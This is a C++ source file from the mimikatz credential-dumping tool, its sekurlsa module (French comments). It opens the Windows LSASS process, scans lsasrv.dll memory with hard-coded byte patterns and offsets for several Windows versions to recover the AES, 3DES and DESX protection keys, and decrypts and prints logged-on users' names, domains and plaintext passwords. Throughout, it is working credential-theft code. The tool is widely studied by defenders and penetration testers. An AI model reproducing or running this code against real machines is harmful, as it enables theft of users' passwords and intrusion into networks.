/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mod_mimikatz_sekurlsa.h"
HMODULE mod_mimikatz_sekurlsa::hLsaSrv = NULL;
HANDLE mod_mimikatz_sekurlsa::hLSASS = NULL;
mod_process::PKIWI_MODULEENTRY32 mod_mimikatz_sekurlsa::pModLSASRV = NULL;
PLSA_SECPKG_FUNCTION_TABLE mod_mimikatz_sekurlsa::SeckPkgFunctionTable = NULL;
PBYTE * mod_mimikatz_sekurlsa::g_pRandomKey = NULL, * mod_mimikatz_sekurlsa::g_pDESXKey = NULL;
bool mod_mimikatz_sekurlsa::population = false;
vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> mod_mimikatz_sekurlsa::GLOB_ALL_Providers;

#ifdef _M_X64
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]	= {0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3};
LONG OFFS_WNT5_g_pRandomKey							= -(6 + 2 + 5 + sizeof(long));
LONG OFFS_WNT5_g_cbRandomKey						= OFFS_WNT5_g_pRandomKey - (3 + sizeof(long));
LONG OFFS_WNT5_g_pDESXKey							= OFFS_WNT5_g_cbRandomKey - (2 + 5 + sizeof(long));
LONG OFFS_WNT5_g_Feedback							= OFFS_WNT5_g_pDESXKey - (3 + 7 + 6 + 2 + 5 + 5 + sizeof(long));

BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D};
LONG OFFS_WNO8_hAesKey								= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 5 + 3;
LONG OFFS_WN61_h3DesKey								= - (2 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 2 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WN61_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 2 + 4 + 3;
LONG OFFS_WN60_h3DesKey								= - (6 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 6 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WN60_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 6 + 4 + 3;

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0x0D};
LONG OFFS_WIN8_hAesKey								= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 4 + 3;
LONG OFFS_WIN8_h3DesKey								= - (6 + 2 + 2 + 6 + 3 + 4 + 2 + 4 + 5 + 6 + 2 + 2 + 6 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WIN8_InitializationVector					= OFFS_WIN8_hAesKey + sizeof(long) + 3 + 4 + 5 + 6 + 2 + 2 + 6 + 4 + 3;

BYTE PTRN_WNO8_LsaInitializeProtectedMemory[]		= {0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89, 0x73, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x70, 0x48, 0x8b, 0x05};
BYTE PTRN_WIN8_LsaInitializeProtectedMemory[]		= {0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x70, 0x48, 0x8B, 0x05};
LONG OFFS_WNT6_LsaInitializeProtectedMemory			= 0;
#elif defined _M_IX86
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]	= {0x84, 0xC0, 0x74, 0x44, 0x6A, 0x08, 0x68};
LONG OFFS_WNT5_g_Feedback							= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
LONG OFFS_WNT5_g_pRandomKey							= OFFS_WNT5_g_Feedback	+ sizeof(long) + 5 + 2 + 2 + 2;
LONG OFFS_WNT5_g_pDESXKey							= OFFS_WNT5_g_pRandomKey+ sizeof(long) + 2;
LONG OFFS_WNT5_g_cbRandomKey						= OFFS_WNT5_g_pDESXKey	+ sizeof(long) + 5 + 2;

BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x3B, 0xF3, 0x7C, 0x2C, 0x6A, 0x02, 0x6A, 0x10, 0x68};
LONG OFFS_WNO8_hAesKey								= -(5 + 6 + sizeof(long));
LONG OFFS_WNO8_h3DesKey								= OFFS_WNO8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 1 + 2 + 2 + 2 + 5 + 1 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 5 + 6 + sizeof(long));
LONG OFFS_WNO8_InitializationVector					= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x85, 0xF6, 0x78, 0x2A, 0x6A, 0x02, 0x6A, 0x10, 0x68};
LONG OFFS_WIN8_hAesKey								= -(2 + 6 + sizeof(long));
LONG OFFS_WIN8_h3DesKey								= OFFS_WIN8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 2 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 6 + sizeof(long));
LONG OFFS_WIN8_InitializationVector					= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);

BYTE PTRN_WNT6_LsaInitializeProtectedMemory[]		= {0x33, 0xC0, 0x8D, 0x7D, 0xE5, 0xAB};
LONG OFFS_WNT6_LsaInitializeProtectedMemory			= -26;
ULONG SIZE_PTRN_WNT6_LsaInitializeProtectedMemory	= sizeof(PTRN_WNT6_LsaInitializeProtectedMemory);
#endif

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_sekurlsa::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_msv1_0::getMSV,		L"msv",		L"énumère les sessions courantes du provider MSV1_0"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_wdigest::getWDigest,	L"wdigest",	L"énumère les sessions courantes du provider WDigest"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_kerberos::getKerberos,	L"kerberos",L"énumère les sessions courantes du provider Kerberos"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_tspkg::getTsPkg,		L"tspkg",	L"énumère les sessions courantes du provider TsPkg"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_livessp::getLiveSSP,	L"livessp",	L"énumère les sessions courantes du provider LiveSSP"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(getLogonPasswords,	L"logonPasswords",	L"énumère les sessions courantes des providers disponibles"));
	return monVector;
}

bool mod_mimikatz_sekurlsa::getLogonPasswords(vector<wstring> * arguments)
{
	return (searchLSASSDatas() ? getLogonData(arguments, &GLOB_ALL_Providers) : false);
}

bool mod_mimikatz_sekurlsa::loadLsaSrv()
{
	hLsaSrv = LoadLibrary(L"lsasrv");
	return (hLsaSrv != NULL && hLsaSrv != INVALID_HANDLE_VALUE);
}

bool mod_mimikatz_sekurlsa::unloadLsaSrv()
{
	if(pModLSASRV)
		delete pModLSASRV;
	if(mod_mimikatz_sekurlsa_kerberos::pModKERBEROS)
		delete mod_mimikatz_sekurlsa_kerberos::pModKERBEROS;
	if(mod_mimikatz_sekurlsa_livessp::pModLIVESSP)
		delete mod_mimikatz_sekurlsa_livessp::pModLIVESSP;
	if(mod_mimikatz_sekurlsa_tspkg::pModTSPKG)
		delete mod_mimikatz_sekurlsa_tspkg::pModTSPKG;
	if(mod_mimikatz_sekurlsa_wdigest::pModWDIGEST)
		delete mod_mimikatz_sekurlsa_wdigest::pModWDIGEST;

	if(g_pRandomKey)
		if(*g_pRandomKey)
			delete[] *g_pRandomKey;
	if(g_pDESXKey)
		if(*g_pDESXKey)
			delete[] *g_pDESXKey;
	if(hLSASS)
		CloseHandle(hLSASS);
	if(hLsaSrv)
		FreeLibrary(hLsaSrv);

	return true;
}

bool mod_mimikatz_sekurlsa::searchLSASSDatas()
{
	if(!population)
	{
		if(!hLSASS)
		{
			mod_process::KIWI_PROCESSENTRY32 monProcess;
			wstring processName = L"lsass.exe";
			if(mod_process::getUniqueForName(&monProcess, &processName))
			{
				hLSASS = OpenProcess(PROCESS_VM_READ, false, monProcess.th32ProcessID);
				vector<mod_process::KIWI_MODULEENTRY32> monVecteurModules;
				if(mod_process::getModulesListForProcessId(&monVecteurModules, &monProcess.th32ProcessID))
				{
					for(vector<mod_process::KIWI_MODULEENTRY32>::iterator leModule = monVecteurModules.begin(); leModule != monVecteurModules.end(); leModule++)
					{
						mod_process::PKIWI_MODULEENTRY32 * lePointeur = NULL;

						if((_wcsicmp(leModule->szModule.c_str(), L"lsasrv.dll") == 0) && !pModLSASRV)
						{
							lePointeur = &pModLSASRV;
							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_msv1_0::getMSVLogonData, wstring(L"msv1_0")));
						}
						else if((_wcsicmp(leModule->szModule.c_str(), L"tspkg.dll") == 0) && !mod_mimikatz_sekurlsa_tspkg::pModTSPKG)
						{
							lePointeur = &mod_mimikatz_sekurlsa_tspkg::pModTSPKG;
							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_tspkg::getTsPkgLogonData, wstring(L"tspkg")));
						}
						else if((_wcsicmp(leModule->szModule.c_str(), L"wdigest.dll") == 0) && !mod_mimikatz_sekurlsa_wdigest::pModWDIGEST)
						{
							lePointeur = &mod_mimikatz_sekurlsa_wdigest::pModWDIGEST;
							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_wdigest::getWDigestLogonData, wstring(L"wdigest")));
						}
						else if((_wcsicmp(leModule->szModule.c_str(), L"livessp.dll") == 0) && !mod_mimikatz_sekurlsa_livessp::pModLIVESSP && (mod_system::GLOB_Version.dwBuildNumber >= 8000))
						{
							lePointeur = &mod_mimikatz_sekurlsa_livessp::pModLIVESSP;
							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_livessp::getLiveSSPLogonData, wstring(L"livessp")));
						}
						else if((_wcsicmp(leModule->szModule.c_str(), L"kerberos.dll") == 0) && !mod_mimikatz_sekurlsa_kerberos::pModKERBEROS)
						{
							lePointeur = &mod_mimikatz_sekurlsa_kerberos::pModKERBEROS;
							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_kerberos::getKerberosLogonData, wstring(L"kerberos")));
						}
						
						if(lePointeur)
							*lePointeur = new mod_process::KIWI_MODULEENTRY32(*leModule);
					}
				} else {
					CloseHandle(hLSASS);
					hLSASS = NULL;
				}
			}
		}

		if(hLSASS)
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), hLsaSrv, &mesInfos, sizeof(MODULEINFO)))
			{
				PBYTE addrMonModule = reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
				if(!SeckPkgFunctionTable)
				{
					struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable = {GetProcAddress(hLsaSrv, "LsaIRegisterNotification"), GetProcAddress(hLsaSrv, "LsaICancelNotification")};
						if(extractPkgFunctionTable.LsaIRegisterNotification && extractPkgFunctionTable.LsaICancelNotification)
							mod_memory::genericPatternSearch(reinterpret_cast<PBYTE *>(&SeckPkgFunctionTable), L"lsasrv", reinterpret_cast<PBYTE>(&extractPkgFunctionTable), sizeof(extractPkgFunctionTable), - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification), NULL, true, true);
				}

				PBYTE ptrBase = NULL;
				DWORD mesSucces = 0;
				if(mod_system::GLOB_Version.dwMajorVersion < 6)
				{
					if(mod_memory::searchMemory(addrMonModule, addrMonModule + mesInfos.SizeOfImage, PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &ptrBase, sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY)))
					{
#ifdef _M_X64
						PBYTE g_Feedback		= reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT5_g_Feedback) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_Feedback));
						g_pRandomKey			= reinterpret_cast<PBYTE *>((ptrBase + OFFS_WNT5_g_pRandomKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_pRandomKey));
						g_pDESXKey				= reinterpret_cast<PBYTE *>((ptrBase + OFFS_WNT5_g_pDESXKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_pDESXKey));
						PDWORD g_cbRandomKey	= reinterpret_cast<PDWORD >((ptrBase + OFFS_WNT5_g_cbRandomKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT5_g_cbRandomKey));
#elif defined _M_IX86
						PBYTE g_Feedback		= *reinterpret_cast<PBYTE  *>(ptrBase + OFFS_WNT5_g_Feedback);
						g_pRandomKey			= *reinterpret_cast<PBYTE **>(ptrBase + OFFS_WNT5_g_pRandomKey);
						g_pDESXKey				= *reinterpret_cast<PBYTE **>(ptrBase + OFFS_WNT5_g_pDESXKey);
						PDWORD g_cbRandomKey	= *reinterpret_cast<PDWORD *>(ptrBase + OFFS_WNT5_g_cbRandomKey);
#endif
						*g_Feedback = NULL; *g_pRandomKey = NULL; *g_pDESXKey = NULL; *g_cbRandomKey = NULL;

						mesSucces = 0;
						if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (g_Feedback - addrMonModule), g_Feedback, 8, hLSASS))
							mesSucces++;
						if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_cbRandomKey) - addrMonModule), g_cbRandomKey, sizeof(DWORD), hLSASS))
							mesSucces++;
						if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(g_pRandomKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS))
						{
							mesSucces++;
							*g_pRandomKey = new BYTE[*g_cbRandomKey];
							if(mod_memory::readMemory(ptrBase, *g_pRandomKey, *g_cbRandomKey, hLSASS))
								mesSucces++;
						}
						if(mod_memory::readMemory(pModLSASRV->modBaseAddr+ (reinterpret_cast<PBYTE>(g_pDESXKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS))
						{
							mesSucces++;
							*g_pDESXKey = new BYTE[144];
							if(mod_memory::readMemory(ptrBase, *g_pDESXKey, 144, hLSASS))
								mesSucces++;
						}
					}
					population = (mesSucces == 6);
				}
				else
				{
#ifdef _M_X64
					PBYTE PTRN_WNT6_LsaInitializeProtectedMemory;
					ULONG SIZE_PTRN_WNT6_LsaInitializeProtectedMemory;
#endif					
					PBYTE PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
					ULONG SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
					LONG OFFS_WNT6_hAesKey, OFFS_WNT6_h3DesKey, OFFS_WNT6_InitializationVector;
					if(mod_system::GLOB_Version.dwBuildNumber < 8000)
					{
#ifdef _M_X64
						PTRN_WNT6_LsaInitializeProtectedMemory = PTRN_WNO8_LsaInitializeProtectedMemory;
						SIZE_PTRN_WNT6_LsaInitializeProtectedMemory = sizeof(PTRN_WNO8_LsaInitializeProtectedMemory);
#endif		
						PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WNO8_LsaInitializeProtectedMemory_KEY;
						SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);
						OFFS_WNT6_hAesKey = OFFS_WNO8_hAesKey;

#ifdef _M_X64
						if(mod_system::GLOB_Version.dwMinorVersion < 1)
						{
							OFFS_WNT6_h3DesKey = OFFS_WN60_h3DesKey;
							OFFS_WNT6_InitializationVector = OFFS_WN60_InitializationVector;
						}
						else
						{
							OFFS_WNT6_h3DesKey = OFFS_WN61_h3DesKey;
							OFFS_WNT6_InitializationVector = OFFS_WN61_InitializationVector;
						}
#elif defined _M_IX86
						OFFS_WNT6_h3DesKey = OFFS_WNO8_h3DesKey;
						OFFS_WNT6_InitializationVector = OFFS_WNO8_InitializationVector;
#endif

					}
					else
					{
#ifdef _M_X64
						PTRN_WNT6_LsaInitializeProtectedMemory = PTRN_WIN8_LsaInitializeProtectedMemory;
						SIZE_PTRN_WNT6_LsaInitializeProtectedMemory = sizeof(PTRN_WIN8_LsaInitializeProtectedMemory);
#endif						
						PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WIN8_LsaInitializeProtectedMemory_KEY;
						SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
						OFFS_WNT6_hAesKey = OFFS_WIN8_hAesKey;
						OFFS_WNT6_h3DesKey = OFFS_WIN8_h3DesKey;
						OFFS_WNT6_InitializationVector = OFFS_WIN8_InitializationVector;
					}
					
					if(mod_memory::searchMemory(addrMonModule, addrMonModule + mesInfos.SizeOfImage, PTRN_WNT6_LsaInitializeProtectedMemory_KEY, &ptrBase, SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY))
					{
#ifdef _M_X64
						PKIWI_BCRYPT_KEY *	hAesKey		= reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase + OFFS_WNT6_hAesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey));
						PKIWI_BCRYPT_KEY *	h3DesKey	= reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase + OFFS_WNT6_h3DesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey));
						PBYTE	InitializationVector	= reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT6_InitializationVector) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_InitializationVector));
#elif defined _M_IX86
						PKIWI_BCRYPT_KEY *	hAesKey		= *reinterpret_cast<PKIWI_BCRYPT_KEY **>(ptrBase + OFFS_WNT6_hAesKey);
						PKIWI_BCRYPT_KEY *	h3DesKey	= *reinterpret_cast<PKIWI_BCRYPT_KEY **>(ptrBase + OFFS_WNT6_h3DesKey);
						PBYTE	InitializationVector	= *reinterpret_cast<PBYTE * >(ptrBase + OFFS_WNT6_InitializationVector);
#endif

						PLSA_INITIALIZE_PROTECTED_MEMORY LsaInitializeProtectedMemory;
						if(mod_memory::genericPatternSearch(reinterpret_cast<PBYTE *>(&LsaInitializeProtectedMemory), L"lsasrv", PTRN_WNT6_LsaInitializeProtectedMemory, SIZE_PTRN_WNT6_LsaInitializeProtectedMemory, OFFS_WNT6_LsaInitializeProtectedMemory, NULL, true, true))
						{
							if(NT_SUCCESS(LsaInitializeProtectedMemory()))
							{
								mesSucces = 0;
								if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (InitializationVector - addrMonModule), InitializationVector, 16, hLSASS))
									mesSucces++;
						
								KIWI_BCRYPT_KEY maCle;
								KIWI_BCRYPT_KEY_DATA maCleData;

								if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(hAesKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS))
									if(mod_memory::readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), hLSASS))
										if(mod_memory::readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), hLSASS))
											if(mod_memory::readMemory(maCle.cle, (*hAesKey)->cle, maCleData.size - 2*sizeof(PVOID), hLSASS)) /* 2 pointeurs internes à la fin, la structure de départ me semble inutile ^o) */
												mesSucces++;

								if(mod_memory::readMemory(pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(h3DesKey) - addrMonModule), &ptrBase, sizeof(PBYTE), hLSASS)) /* la structure de départ me semble inutile ^o) */
									if(mod_memory::readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), hLSASS))
										if(mod_memory::readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), hLSASS))
											if(mod_memory::readMemory(maCle.cle, (*h3DesKey)->cle, maCleData.size, hLSASS))
												mesSucces++;
							}
						}
					}
					population = (mesSucces == 3);
				}
			}
		}
	}
	return population;
}

PLIST_ENTRY mod_mimikatz_sekurlsa::getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind)
{
	PLIST_ENTRY resultat = NULL;
	BYTE * monBuffer = new BYTE[LUIDoffset + sizeof(LUID)];
	PLIST_ENTRY pStruct = NULL;
	if(mod_memory::readMemory(pSecurityStruct, &pStruct, sizeof(pStruct), hLSASS))
	{
		while(pStruct != pSecurityStruct)
		{
			if(mod_memory::readMemory(pStruct, monBuffer, LUIDoffset + sizeof(LUID), hLSASS))
			{
				if(RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(monBuffer) + LUIDoffset)))
				{
					resultat = pStruct;
					break;
				}
			} else break;
			pStruct = reinterpret_cast<PLIST_ENTRY>(monBuffer)->Flink;
		}
	}
	delete [] monBuffer;
	return resultat;
}

PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuid(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	if(mod_memory::readMemory(pTable, &maTable, sizeof(RTL_AVL_TABLE), hLSASS))
		resultat = getPtrFromAVLByLuidRec(reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.RightChild), LUIDoffset, luidToFind);
	return resultat;
}

PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	if(mod_memory::readMemory(pTable, &maTable, sizeof(RTL_AVL_TABLE), hLSASS))
	{
		if(maTable.OrderedPointer)
		{
			BYTE * monBuffer = new BYTE[LUIDoffset + sizeof(LUID)];
			if(mod_memory::readMemory(maTable.OrderedPointer, monBuffer, LUIDoffset + sizeof(LUID), hLSASS))
			{
				if(RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(monBuffer) + LUIDoffset)))
					resultat = maTable.OrderedPointer;
			}
			delete [] monBuffer;
		}

		if(!resultat && maTable.BalancedRoot.LeftChild)
			resultat = getPtrFromAVLByLuidRec(reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.LeftChild), LUIDoffset, luidToFind);
		if(!resultat && maTable.BalancedRoot.RightChild)
			resultat = getPtrFromAVLByLuidRec(reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.RightChild), LUIDoffset, luidToFind);
	}
	return resultat;
}

wstring mod_mimikatz_sekurlsa::getUnicodeString(LSA_UNICODE_STRING * ptrString, bool isPassword)
{
	wstring maChaine;
	if(ptrString->Buffer && (ptrString->Length > 0))
	{
		BYTE * monBuffer = new BYTE[ptrString->MaximumLength];
		if(mod_memory::readMemory(ptrString->Buffer, monBuffer, ptrString->MaximumLength, hLSASS))
		{
			if(isPassword)
				SeckPkgFunctionTable->LsaUnprotectMemory(monBuffer, ptrString->MaximumLength);
			maChaine.assign(mod_text::stringOrHex(reinterpret_cast<PBYTE>(monBuffer), ptrString->Length));
		}
		delete[] monBuffer;
	}
	return maChaine;
}

void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isTsPkg)
{
	if(mesCreds)
	{
		wstring password = getUnicodeString(&mesCreds->Password, true);
		if(justSecurity)
			wcout << password;
		else
		{
			wstring userName = getUnicodeString(&mesCreds->UserName);
			wstring domainName = getUnicodeString(&mesCreds->Domaine);
			wcout << endl <<
					L"\t * Utilisateur  : " << (isTsPkg ? domainName : userName) << endl <<
					L"\t * Domaine      : " << (isTsPkg ? userName : domainName) << endl <<
					L"\t * Mot de passe : " << password;
		}
	} else wcout << L"n.t. (LUID KO)";
}

bool mod_mimikatz_sekurlsa::getLogonData(vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders)
{
	PLUID sessions;
	ULONG count;

	if (NT_SUCCESS(LsaEnumerateLogonSessions(&count, &sessions)))
	{
		for (ULONG i = 0; i < count ; i++)
		{
			PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
			if(NT_SUCCESS(LsaGetLogonSessionData(&sessions[i], &sessionData)))
			{
				if(sessionData->LogonType != Network)
				{
					wstring username(sessionData->UserName.Buffer, sessionData->UserName.Length / sizeof(wchar_t));
					wstring package(sessionData->AuthenticationPackage.Buffer, sessionData->AuthenticationPackage.Length / sizeof(wchar_t));
					wstring domain(sessionData->LogonDomain.Buffer, sessionData->LogonDomain.Length / sizeof(wchar_t));
				
					wcout << endl <<
						L"Authentification Id         : " << sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
						L"Package d\'authentification  : " << package << endl <<
						L"Utilisateur principal       : " << username << endl <<
						L"Domaine d\'authentification  : " << domain << endl;

					for(vector<pair<PFN_ENUM_BY_LUID, wstring>>::iterator monProvider = mesProviders->begin(); monProvider != mesProviders->end(); monProvider++)
					{
						wcout << L'\t' << monProvider->second << L" : \t";
						monProvider->first(&sessions[i], mesArguments->empty());
						wcout << endl;
					}
				}
				LsaFreeReturnBuffer(sessionData);
			}
			else wcout << L"Erreur : Impossible d\'obtenir les données de session" << endl;
		}
		LsaFreeReturnBuffer(sessions);
	}
	else wcout << L"Erreur : Impossible d\'énumerer les sessions courantes" << endl;

	return true;
}
